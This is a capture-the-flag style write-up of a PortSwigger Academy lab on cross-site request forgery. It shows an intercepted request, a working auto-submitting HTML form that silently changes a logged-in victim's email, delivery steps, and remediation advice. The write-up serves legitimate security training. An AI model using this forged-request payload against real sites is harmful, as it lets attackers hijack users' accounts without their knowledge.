# PortSwigger Lab: CSRF Vulnerability with No Defenses

**Platform:** PortSwigger Web Security Academy  
**Category:** Cross-Site Request Forgery (CSRF)  
**Difficulty:** Apprentice  
**Status:** ✅ Solved

---

## Overview

This lab demonstrates a classic CSRF vulnerability where the application has no protections in place against forged cross-site requests. The goal is to craft a malicious HTML page that, when visited by the victim, silently changes their email address.

---

## What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that tricks a victim's browser into sending an authenticated request to a web application without their knowledge. Since the browser automatically attaches session cookies to requests, the server cannot distinguish a legitimate request from a forged one — unless CSRF defenses are in place.

---

## Reconnaissance

After logging in with the provided credentials (`wiener:peter`), I navigated to the account settings page and changed my email address while intercepting the traffic in Burp Suite.

The intercepted request looked like this:

```
POST /my-account/change-email HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<session-token>
Content-Type: application/x-www-form-urlencoded

email=test%40test.com
```

**Key observations:**
- The endpoint uses a `POST` request with a single `email` parameter
- There is no CSRF token in the request
- There is no `SameSite` cookie attribute enforced
- No `Origin` or `Referer` header validation is performed

This means any website can forge this request on behalf of a logged-in victim.

---

## Exploit

I crafted the following HTML page and hosted it on the exploit server provided by the lab:

```html
<html>
  <body>
    <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**How it works:**
1. The page loads a hidden HTML form targeting the victim's email-change endpoint
2. The JavaScript auto-submits the form as soon as the page loads
3. The victim's browser sends the POST request with their session cookie attached automatically
4. The server processes it as a legitimate request and updates the email

---

## Delivery

1. Pasted the exploit HTML into the **Body** field of the exploit server
2. Clicked **Store** to save the exploit
3. Clicked **Deliver to victim** to simulate the victim visiting the malicious page

The lab was marked as **Solved** after the victim's email was successfully changed.

---

## Key Takeaway

> A common mistake is using the exploit server's URL in the form `action` instead of the actual lab URL. These are two different domains — the `action` must point to the target application, not the exploit server.

---

## Remediation

To protect against CSRF attacks, developers should implement one or more of the following:

- **CSRF tokens** — Include a unique, unpredictable token in every state-changing request and validate it server-side
- **SameSite cookies** — Set `SameSite=Strict` or `SameSite=Lax` on session cookies to prevent them from being sent on cross-origin requests
- **Origin/Referer header validation** — Reject requests where the `Origin` or `Referer` header does not match the expected domain
- **Custom request headers** — Require a custom header (e.g. `X-Requested-With`) that browsers cannot add in cross-origin requests without CORS permission

---

## References

- [PortSwigger CSRF Lab](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
